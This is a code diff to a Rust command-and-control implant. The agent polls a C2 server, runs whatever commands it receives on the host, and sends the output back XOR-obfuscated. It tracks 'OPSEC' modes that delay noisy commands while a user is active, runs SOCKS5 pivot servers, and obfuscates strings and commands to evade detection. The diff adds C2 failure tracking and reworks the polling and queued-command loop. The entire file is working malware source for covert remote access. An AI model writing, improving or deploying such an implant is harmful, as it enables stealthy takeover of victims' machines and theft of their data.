@@ -7,7 +7,7 @@ use crate::opsec::{OPSEC_STATE, AgentMode, determine_agent_mode};
 use crate::util::random_jitter;
 use get_if_addrs::get_if_addrs;
 use hostname;
-use log::{info, error, debug};
+use log::{info, error, debug, warn};
 use once_cell::sync::Lazy;
 use os_info;
 use reqwest::StatusCode;
@@ -25,10 +25,16 @@ use tokio::sync::mpsc;
 use tokio::task::JoinHandle;
 use tokio::time::timeout;
 use obfstr::obfstr;
+use serde::Deserialize;
 
 static PIVOT_SERVERS: Lazy<TokioMutex<HashMap<u16, JoinHandle<()>>>> = Lazy::new(|| TokioMutex::new(HashMap::new()));
 static QUEUED_COMMANDS: Lazy<Mutex<Vec<String>>> = Lazy::new(|| Mutex::new(Vec::new()));
 
+// Define the expected structure for the command response JSON
+#[derive(Deserialize)]
+struct CommandResponse {
+    command: String,
+}
 
 #[cfg(windows)]
 fn create_command(command: &str, args: &[&str]) -> Command {
@@ -122,11 +128,33 @@ async fn execute_command(cmd_parts: &[&str]) -> io::Result<String> {
     }
 }
 
+// Helper function to update C2 failure state
+fn update_c2_failure_state(success: bool) {
+    if let Ok(mut state_guard) = OPSEC_STATE.lock() {
+        if success {
+            if state_guard.consecutive_c2_failures > 0 {
+                debug!("[OPSEC C2] C2 communication successful, resetting failure count from {}", state_guard.consecutive_c2_failures);
+                state_guard.consecutive_c2_failures = 0;
+            }
+        } else {
+            state_guard.consecutive_c2_failures = state_guard.consecutive_c2_failures.saturating_add(1);
+            warn!("[OPSEC C2] C2 communication failed, consecutive failures: {}", state_guard.consecutive_c2_failures);
+        }
+    } else {
+        error!("[OPSEC C2] Failed to lock OPSEC_STATE to update C2 failure count.");
+    }
+}
+
 // Send heartbeat to the server
-async fn send_heartbeat_with_client(config: &AgentConfig, server_addr: &str, agent_id: &str) -> io::Result<()> {
+pub async fn send_heartbeat_with_client(config: &AgentConfig, server_addr: &str, agent_id: &str) -> io::Result<()> {
     let url = format!("{}/{}", server_addr, obfstr!("api/agent/{}/heartbeat").to_string().replace("{}", agent_id));
     info!("[HTTP] Sending heartbeat POST to {} (SOCKS5 enabled: {})", url, config.socks5_enabled);
-    let client = config.build_http_client()?;
+    let client_result = config.build_http_client();
+    if client_result.is_err() { // Handle client build failure as a C2 failure
+        update_c2_failure_state(false);
+        return Err(client_result.err().unwrap());
+    }
+    let client = client_result.unwrap();
     
     let os = os_info::get();
     let hostname = hostname::get()?
@@ -146,55 +174,71 @@ async fn send_heartbeat_with_client(config: &AgentConfig, server_addr: &str, age
         "commands": Vec::<String>::new()
     });
 
-    let response = client.post(&url)
-        .json(&data)
-        .send()
-        .await
-        .map_err(|e| {
+    match client.post(&url).json(&data).send().await {
+        Ok(response) => {
+            info!("[HTTP] Heartbeat response: {} (SOCKS5 enabled: {})", response.status(), config.socks5_enabled);
+            if response.status().is_success() {
+                update_c2_failure_state(true); // SUCCESS
+                Ok(())
+            } else {
+                error!("[HTTP] Heartbeat failed with status: {}", response.status());
+                update_c2_failure_state(false); // FAILURE
+                Err(io::Error::new(io::ErrorKind::Other, 
+                    format!("Heartbeat failed with status: {}", response.status())))
+            }
+        }
+        Err(e) => {
             error!("[HTTP] Heartbeat POST failed: {}", e);
-            io::Error::new(io::ErrorKind::Other, e)
-        })?;
-    info!("[HTTP] Heartbeat response: {} (SOCKS5 enabled: {})", response.status(), config.socks5_enabled);
-    if !response.status().is_success() {
-        error!("[HTTP] Heartbeat failed with status: {}", response.status());
-        return Err(io::Error::new(io::ErrorKind::Other, 
-            format!("Heartbeat failed with status: {}", response.status())));
+            update_c2_failure_state(false); // FAILURE
+            Err(io::Error::new(io::ErrorKind::Other, e))
     }
-    Ok(())
+    }
 }
 
 // Fetch command from the server
 async fn get_command_with_client(config: &AgentConfig, server_addr: &str, agent_id: &str) -> io::Result<Option<String>> {
     let url = format!("{}/{}", server_addr, obfstr!("api/agent/{}/command").to_string().replace("{}", agent_id));
     info!("[HTTP] Sending command GET to {} (SOCKS5 enabled: {})", url, config.socks5_enabled);
-    let client = config.build_http_client()?;
-    let response = client.get(&url)
-        .send()
-        .await
-        .map_err(|e| {
-            error!("[HTTP] Command GET failed: {}", e);
-            io::Error::new(io::ErrorKind::Other, e)
-        })?;
+    let client_result = config.build_http_client();
+    if client_result.is_err() {
+        update_c2_failure_state(false);
+        return Err(client_result.err().unwrap());
+    }
+    let client = client_result.unwrap();
+
+    match client.get(&url).send().await {
+        Ok(response) => {
     info!("[HTTP] Command GET response: {} (SOCKS5 enabled: {})", response.status(), config.socks5_enabled);
     if response.status() == StatusCode::NO_CONTENT {
+                update_c2_failure_state(true); // SUCCESS (no command)
         return Ok(None);
     }
-    if !response.status().is_success() {
+            if response.status().is_success() {
+                // Attempt to parse JSON. If it fails, it's still a C2 communication failure *semantically*.
+                match response.json::<CommandResponse>().await {
+                    Ok(cmd_resp) => {
+                        update_c2_failure_state(true); // SUCCESS (command received and parsed)
+                        Ok(Some(cmd_resp.command))
+                    }
+                    Err(e) => {
+                        error!("[HTTP] Failed to parse command response JSON: {}", e);
+                        update_c2_failure_state(false); // FAILURE (bad response from C2)
+                        Err(io::Error::new(io::ErrorKind::Other, e))
+                    }
+                }
+            } else {
         error!("[HTTP] Command fetch failed with status: {}", response.status());
-        return Err(io::Error::new(io::ErrorKind::Other, 
-            format!("Command fetch failed with status: {}", response.status())));
+                update_c2_failure_state(false); // FAILURE (bad HTTP status)
+                Err(io::Error::new(io::ErrorKind::Other, 
+                    format!("Command fetch failed with status: {}", response.status())))
+            }
+        }
+        Err(e) => {
+            error!("[HTTP] Command GET failed (network error): {}", e);
+            update_c2_failure_state(false); // FAILURE (network layer)
+            Err(io::Error::new(io::ErrorKind::Other, e))
+        }
     }
-
-    #[derive(serde::Deserialize)]
-    struct CommandResponse {
-        command: String,
-    }
-
-    let cmd_resp = response.json::<CommandResponse>()
-        .await
-        .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;
-    
-    Ok(Some(cmd_resp.command))
 }
 
 // Submit result to the server
@@ -207,29 +251,37 @@ async fn submit_result_with_client(
 ) -> io::Result<()> {
     let url = format!("{}/{}", server_addr, obfstr!("api/agent/{}/result").to_string().replace("{}", agent_id));
     info!("[HTTP] Sending result POST to {} (SOCKS5 enabled: {})", url, config.socks5_enabled);
-    let client = config.build_http_client()?;
+    let client_result = config.build_http_client();
+    if client_result.is_err() {
+        update_c2_failure_state(false);
+        return Err(client_result.err().unwrap());
+    }
+    let client = client_result.unwrap();
     let obfuscated_output = xor_obfuscate(output, agent_id);
     let data = json!({
         "command": command,
         "output": obfuscated_output
     });
 
-    let response = client.post(&url)
-        .json(&data)
-        .send()
-        .await
-        .map_err(|e| {
-            error!("[HTTP] Result POST failed: {}", e);
-            io::Error::new(io::ErrorKind::Other, e)
-        })?;
+    match client.post(&url).json(&data).send().await {
+        Ok(response) => {
     info!("[HTTP] Result POST response: {} (SOCKS5 enabled: {})", response.status(), config.socks5_enabled);
-    if !response.status().is_success() {
+            if response.status().is_success() {
+                update_c2_failure_state(true); // SUCCESS
+                Ok(())
+            } else {
         error!("[HTTP] Result submission failed with status: {}", response.status());
-        return Err(io::Error::new(io::ErrorKind::Other, 
-            format!("Result submission failed with status: {}", response.status())));
+                update_c2_failure_state(false); // FAILURE (bad HTTP status)
+                Err(io::Error::new(io::ErrorKind::Other, 
+                    format!("Result submission failed with status: {}", response.status())))
+            }
+        }
+        Err(e) => {
+            error!("[HTTP] Result POST failed (network error): {}", e);
+            update_c2_failure_state(false); // FAILURE (network layer)
+            Err(io::Error::new(io::ErrorKind::Other, e))
+        }
     }
-
-    Ok(())
 }
 
 fn is_weak_command(cmd: &str) -> bool {
@@ -258,21 +310,25 @@ fn is_strong_command(cmd: &str) -> bool {
 }
 
 // Check if the command should be executed based on the current opsec mode
-async fn should_execute_command(cmd: &str) -> bool {
-    let mode = OPSEC_STATE.lock().unwrap().mode;
-    debug!("[OPSEC] should_execute_command: mode={:?}, cmd={}", mode, cmd);
+// This function now only queues, execution logic is in agent_loop
+fn should_queue_command(cmd: &str) -> bool {
+    let mode;
+    { // Scope for lock
+        mode = OPSEC_STATE.lock().unwrap().mode;
+    }
+    debug!("[OPSEC] should_queue_command: mode={:?}, cmd={}", mode, cmd);
     match mode {
-        AgentMode::FullOpsec => {
-            if is_weak_command(cmd) {
-                debug!("[OPSEC] FullOpsec: Quiet command allowed: {}", cmd);
-                true
-            } else {
-                debug!("[OPSEC] FullOpsec: Queuing command: {}", cmd);
+        AgentMode::FullOpsec | AgentMode::ReducedActivity => {
+            // Always queue in these modes, even weak commands, 
+            // as agent_loop shouldn't be running to execute them anyway.
+            debug!("[OPSEC] {:?}: Queuing command: {}", mode, cmd);
                 QUEUED_COMMANDS.lock().unwrap().push(cmd.to_string());
-                false
+            true // Indicates command was queued
             }
+        AgentMode::BackgroundOpsec => {
+             debug!("[OPSEC] BackgroundOpsec: Not queuing command: {}", cmd);
+            false // Do not queue in BackgroundOpsec
         }
-        AgentMode::BackgroundOpsec => true,
     }
 }
 
@@ -284,20 +340,31 @@ pub async fn agent_loop(
     pivot_tx: mpsc::Sender<crate::networking::socks5_pivot::PivotFrame>,
 ) -> Result<(), Box<dyn std::error::Error>> {
     let config = AgentConfig::load()?;
-    info!("[SHELL] Starting shell with agent ID: {}", agent_id);
-    send_heartbeat_with_client(&config, server_addr, agent_id).await?;
+    info!("[SHELL] Entering agent_loop (BackgroundOpsec Active)");
+    // Initial heartbeat for this active period
+    // Use a separate Result variable to avoid breaking loop on first heartbeat failure
+    let initial_heartbeat_result = send_heartbeat_with_client(&config, server_addr, agent_id).await;
+    if let Err(e) = initial_heartbeat_result {
+        error!("[SHELL] Initial heartbeat failed: {}. Returning to main loop for OPSEC re-assessment.", e);
+        // No need to break explicitly, loop condition will handle it if state changed due to failure
+    }
 
     loop {
-        let mode = determine_agent_mode(&config);
-        let (base, jitter) = match mode {
-            AgentMode::FullOpsec => (2, 2),
-            AgentMode::BackgroundOpsec => (1, 1),
-        };
-        let sleep_time = random_jitter(base, jitter);
+        // Determine current OPSEC mode *before* acting
+        let current_mode = determine_agent_mode(&config);
 
-        info!("[SHELL] Polling for commands...");
-        match get_command_with_client(&config, server_addr, agent_id).await? {
-            Some(command) => {
+        // If no longer in BackgroundOpsec, exit agent_loop immediately
+        if current_mode != AgentMode::BackgroundOpsec {
+            info!("[SHELL] OPSEC mode changed to {:?}. Exiting agent_loop.", current_mode);
+            break Ok(()); // Exit loop, return control to main.rs
+        }
+
+        // Still in BackgroundOpsec, proceed with C2 communication
+        let sleep_time = random_jitter(config.sleep_interval, config.jitter);
+        info!("[SHELL] Polling for commands (Interval: {}s)", sleep_time);
+        
+        match get_command_with_client(&config, server_addr, agent_id).await {
+            Ok(Some(command)) => {
                 info!("[SHELL] Received command: {}", command);
 
                 if command.starts_with("pivot_start ") {
@@ -316,61 +383,125 @@ pub async fn agent_loop(
                     }
                 }
 
-                // Re-check OPSEC before execution
-                if should_execute_command(&command).await {
+                // Queue check (moved earlier, simplified)
+                if !should_queue_command(&command) {
+                    // If not queued, proceed to execute in BackgroundOpsec
                     let mut obf_cmd = command.clone();
-                    obf_cmd = random_case(&obf_cmd, 0.5);
-                    obf_cmd = random_quote_insertion(&obf_cmd, 0.3);
-                    obf_cmd = random_char_insertion(&obf_cmd, 0.2);
-                    obf_cmd = obfuscate_command(&obf_cmd);
+                    // obf_cmd = random_case(&obf_cmd, 0.5); // TEMP DISABLED
+                    // obf_cmd = random_quote_insertion(&obf_cmd, 0.3); // TEMP DISABLED
+                    // obf_cmd = random_char_insertion(&obf_cmd, 0.2); // TEMP DISABLED
+                    // obf_cmd = obfuscate_command(&obf_cmd); // TEMP DISABLED
+
+                    // debug!("[OPSEC] Executing obfuscated command: '{}', original: '{}'", obf_cmd, command); // Log both for clarity
+                    // For now, log the command that will actually be used for parts:
+                    debug!("[OPSEC] Preparing to execute command: '{}' (obfuscation disabled)", obf_cmd);
 
                     let cmd_parts: Vec<&str> = obf_cmd.split_whitespace().collect();
-                    debug!("[OPSEC] Executing command: {}", command);
+                    // debug!("[OPSEC] Executing command: {}", command); // This was the old log, replaced by the one above
+
+                    // --- NEW: Update OPSEC state if command is noisy ---
+                    if is_strong_command(&command) { // Use original command for check
+                        if let Ok(mut state_guard) = OPSEC_STATE.lock() {
+                            state_guard.last_noisy_command_time = Some(std::time::Instant::now());
+                            debug!("[OPSEC] Marked noisy command execution time: {}", command);
+                        } else {
+                            error!("[OPSEC] Failed to lock OPSEC_STATE to mark noisy command.");
+                        }
+                    }
+                    // --- END NEW ---
 
                     match execute_command(&cmd_parts).await {
                         Ok(output) => {
                             if let Err(e) = submit_result_with_client(&config, server_addr, agent_id, &command, &output).await {
                                 error!("[SHELL] Failed to submit result: {}", e);
+                                // C2 failure counter updated in submit_result_with_client
                             } else {
                                 info!("[SHELL] Result submitted successfully");
                             }
                         }
                         Err(e) => {
                             let error_msg = format!("Command failed: {}", e);
-                            if let Err(e) = submit_result_with_client(&config, server_addr, agent_id, &command, &error_msg).await {
-                                error!("[SHELL] Failed to submit error result: {}", e);
+                            if let Err(e_submit) = submit_result_with_client(&config, server_addr, agent_id, &command, &error_msg).await {
+                                error!("[SHELL] Failed to submit error result: {}", e_submit);
                             }
-                            error!("[SHELL] Shell error: {}. Retrying...", e);
+                            error!("[SHELL] Command execution error: {}. Continuing...", e);
                         }
                     }
                 } else {
-                    debug!("[OPSEC] Command queued for later execution: {}", command);
-                    continue;
+                    // Command queued by should_queue_command
+                    debug!("[SHELL] Command queued for later execution (in BackgroundOpsec): {}", command);
+                    // NOTE: Queue is now processed here, right after checking
                 }
             }
-            None => {
-                debug!("[SHELL] No command received, sleeping for {} seconds", sleep_time);
-                tokio::time::sleep(Duration::from_secs(sleep_time)).await;
+            Ok(None) => {
+                debug!("[SHELL] No command received.");
+                // No command is a successful C2 interaction, failure counter reset in get_command
+            }
+            Err(e) => {
+                 error!("[SHELL] Failed to get command: {}. Sleeping...", e);
+                 // C2 failure counter updated in get_command
             }
         }
 
-        // In BackgroundOpsec, drain and execute queued commands
-        if let AgentMode::BackgroundOpsec = determine_agent_mode(&config) {
-            let mut queue = QUEUED_COMMANDS.lock().unwrap();
-            for cmd in queue.drain(..) {
-                debug!("[OPSEC] BackgroundOpsec: Executing queued command: {}", cmd);
+        // --- Process Queued Commands --- 
+        // Always check and process queue while in BackgroundOpsec
+        let mut commands_to_run = Vec::new();
+        {
+            // Scope for QUEUED_COMMANDS lock
+            let mut queue_guard = QUEUED_COMMANDS.lock().unwrap();
+            commands_to_run.extend(queue_guard.drain(..));
+        } // Lock released
+        
+        if !commands_to_run.is_empty() {
+            info!("[SHELL] Processing {} queued commands...", commands_to_run.len());
+            for cmd in commands_to_run {
+                 // Re-check mode *before executing each queued command*
+                 let mode_before_queued = determine_agent_mode(&config);
+                 if mode_before_queued != AgentMode::BackgroundOpsec {
+                    info!("[SHELL] OPSEC mode changed to {:?} while processing queue. Re-queuing remaining commands and exiting agent_loop.", mode_before_queued);
+                    // Re-queue the command we didn't run + any others that were drained
+                    // (Alternative: only re-queue current 'cmd' if needed)
+                    let mut queue_guard = QUEUED_COMMANDS.lock().unwrap();
+                    queue_guard.push(cmd); // Re-queue the current one
+                    // queue_guard.extend(commands_to_run[index+1..].iter().cloned()); // If we tracked index
+                    break; // Exit the processing loop
+                 }
+
+                debug!("[SHELL] Executing queued command: {}", cmd);
                 let cmd_parts: Vec<&str> = cmd.split_whitespace().collect();
-                if let Ok(output) = execute_command(&cmd_parts).await {
+                
+                // --- NEW: Update OPSEC state if queued command is noisy --- 
+                if is_strong_command(&cmd) { // Use original command for check
+                    if let Ok(mut state_guard) = OPSEC_STATE.lock() {
+                        state_guard.last_noisy_command_time = Some(std::time::Instant::now());
+                        debug!("[OPSEC] Marked noisy command execution time (queued): {}", cmd);
+                    } else {
+                        error!("[OPSEC] Failed to lock OPSEC_STATE to mark noisy queued command.");
+                    }
+                }
+                // --- END NEW ---
+
+                // Execute command (same logic as above)
+                match execute_command(&cmd_parts).await {
+                    Ok(output) => {
                     let _ = submit_result_with_client(&config, server_addr, agent_id, &cmd, &output).await;
                 }
+                    Err(e) => {
+                         let error_msg = format!("Queued command failed: {}", e);
+                         let _ = submit_result_with_client(&config, server_addr, agent_id, &cmd, &error_msg).await;
+                         error!("[SHELL] Queued command execution error: {}", e);
+                    }
+                }
             }
+            // If the inner loop broke due to mode change, the outer loop condition will catch it next iteration.
         }
+        // --- End Process Queued Commands ---
 
-        // After all command handling and sleeping:
-        if crate::opsec::determine_agent_mode(&config) == crate::opsec::AgentMode::FullOpsec {
-            info!("[OPSEC] User activity or risk detected! Returning to FullOpsec.");
-            break Ok(()); // Exit agent_loop, main loop will re-encrypt and wait
-        }
+        // Sleep before next poll
+        debug!("[SHELL] Sleeping for {} seconds...", sleep_time);
+        tokio::time::sleep(Duration::from_secs(sleep_time)).await;
+
+        // Outer loop condition will re-evaluate OPSEC mode on next iteration
     }
 }
 
@@ -406,42 +537,3 @@ async fn stop_pivot_server(port: u16) -> Result<String, String> {
     }
 }
 
-pub async fn handle_command(command: &str) {
-    let mode = OPSEC_STATE.lock().unwrap().mode;
-    match mode {
-        AgentMode::FullOpsec => {
-            if is_strong_command(command) {
-                debug!("[OPSEC] FullOpsec: Queuing noisy command: {}", command);
-                QUEUED_COMMANDS.lock().unwrap().push(command.to_string());
-                return;
-            }
-            // Execute quiet command immediately
-            let mut obf_cmd = command.to_string();
-            obf_cmd = random_case(&obf_cmd, 0.5);
-            obf_cmd = random_quote_insertion(&obf_cmd, 0.3);
-            obf_cmd = random_char_insertion(&obf_cmd, 0.2);
-            obf_cmd = obfuscate_command(&obf_cmd);
-
-            let cmd_parts: Vec<&str> = obf_cmd.split_whitespace().collect();
-            execute_command(&cmd_parts).await;
-        }
-        AgentMode::BackgroundOpsec => {
-            // Execute immediately
-            let mut obf_cmd = command.to_string();
-            obf_cmd = random_case(&obf_cmd, 0.5);
-            obf_cmd = random_quote_insertion(&obf_cmd, 0.3);
-            obf_cmd = random_char_insertion(&obf_cmd, 0.2);
-            obf_cmd = obfuscate_command(&obf_cmd);
-
-            let cmd_parts: Vec<&str> = obf_cmd.split_whitespace().collect();
-            execute_command(&cmd_parts).await;
-            // Drain and execute queued commands
-            let mut queue = QUEUED_COMMANDS.lock().unwrap();
-            for cmd in queue.drain(..) {
-                debug!("[OPSEC] BackgroundOpsec: Executing queued command: {}", cmd);
-                let cmd_parts: Vec<&str> = cmd.split_whitespace().collect();
-                execute_command(&cmd_parts).await;
-            }
-        }
-    }
-}
